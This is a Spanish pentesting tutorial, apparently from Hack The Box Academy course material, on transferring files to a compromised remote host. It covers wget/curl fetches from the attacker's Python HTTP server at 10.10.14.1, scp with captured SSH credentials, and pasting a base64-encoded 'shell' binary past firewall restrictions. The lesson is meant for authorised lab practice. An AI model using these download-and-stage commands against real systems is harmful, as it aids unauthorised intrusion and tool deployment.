## **TRANSFERENCIA DE ARCHIVOS**

Durante cualquier ejercicio de Pentesting, es probable que necesitemos transferir archivos al servidor remoto, como scripts de enumeración o exploit, o transferir datos a nuestro host de ataque. Si bien las herramientas como Metasploit con un shell Meterpreter nos permiten usar el comando `Upload` para cargar un archivo, debemos aprender métodos para transferir archivos con un reverse shell estándar. 

### USANDO WGET

Hay muchos métodos para lograr esto. Un método es ejecutar un [servidor HTTP de Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) en nuestra máquina y luego usar `wget` o `cURL` para descargar el archivo en el host remoto. Primero, vamos al directorio que contiene el archivo que necesitamos transferir y ejecutamos un servidor Python HTTP en él: 

~~~
Juceco@htb[/htb]$ cd /tmp
Juceco@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
~~~

Ahora que hemos configurado un servidor de escucha en nuestra máquina, podemos descargar el archivo en el host remoto en el que tenemos ejecución de código: 

~~~
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
~~~

Tenga en cuenta que usamos nuestra IP `10.10.14.1` y el puerto en el que se ejecuta nuestro servidor Python `8000`. Si el servidor remoto no tiene `wget`, podemos usar `cURL` para descargar el archivo: 

~~~
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
~~~

Tenga en cuenta que usamos el indicador `-o` para especificar el nombre del archivo de salida.
___

### USANDO SCP

Otro método para transferir archivos sería usar `scp`, dado que hemos obtenido las credenciales de usuario ssh en el host remoto. Podemos hacerlo de la siguiente manera: 

~~~
Juceco@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
~~~

Tenga en cuenta que especificamos el nombre del archivo local después de `scp`, y el directorio remoto se guardará después de `:`

___

### USANDO BASE64

En algunos casos, es posible que no podamos transferir el archivo. Por ejemplo, el host remoto puede tener protecciones de firewall que nos impiden descargar un archivo de nuestra máquina. En este tipo de situación, podemos usar un truco simple para codificar en [base64](https://linux.die.net/man/1/base64) el archivo en formato base64, y luego podemos pegar la cadena `base64` en el servidor remoto y decodificarla. Por ejemplo, si quisiéramos transferir un archivo binario llamado `shell`, podemos codificarlo en `base64` de la siguiente manera: 

~~~
Juceco@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
~~~

Ahora, podemos copiar esta cadena `base64`, ir al host remoto y usar `base64 -d` para decodificarla y canalizar la salida a un archivo: 

~~~
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
~~~

___

### VALIDANDO TRANSFERENCIA DE ARCHIVO

Para validar el formato de un archivo, podemos ejecutar el comando [file](https://linux.die.net/man/1/file) en él: 

~~~
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
~~~

Como podemos ver, cuando ejecutamos el comando de `file` en el archivo de `shell`, dice que es un binario ELF, lo que significa que lo transferimos con éxito. Para asegurarnos de no estropear el archivo durante el proceso de codificación/descodificación, podemos verificar su md5 hash. En nuestra máquina, podemos ejecutar `md5sum` en ella: 

~~~
Juceco@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
~~~

Ahora, podemos ir al servidor remoto y ejecutar el mismo comando en el archivo que transferimos: 

~~~
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
~~~

Como podemos ver, ambos archivos tienen el mismo hash md5, lo que significa que el archivo se transfirió correctamente. Hay varios otros métodos para transferir archivos. Puede consultar el módulo [Transferencias de archivos](https://academy.hackthebox.com/module/details/24) para obtener un estudio más detallado sobre la transferencia de archivos.